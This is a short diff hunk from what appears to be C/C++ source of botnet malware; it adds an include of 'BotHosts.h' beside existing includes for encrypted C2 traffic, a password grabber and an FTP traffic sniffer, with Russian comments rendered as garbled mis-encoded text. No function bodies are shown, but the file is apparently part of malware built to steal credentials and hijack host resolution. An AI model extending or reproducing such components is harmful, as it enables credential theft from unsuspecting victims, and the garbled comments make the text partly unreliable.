@@ -16,6 +16,8 @@
 
 #include "BotCryptHTTP.h" // Ўифрование отправл€емых и принимаемых данных
 
+#include "BotHosts.h" // ¬ключаем использование файла ностов
+
 
 #include "Grabber.h" // ¬ключение грабера паролей
 #include "FtpSniffer.h" // ѕерехват фтп трафика
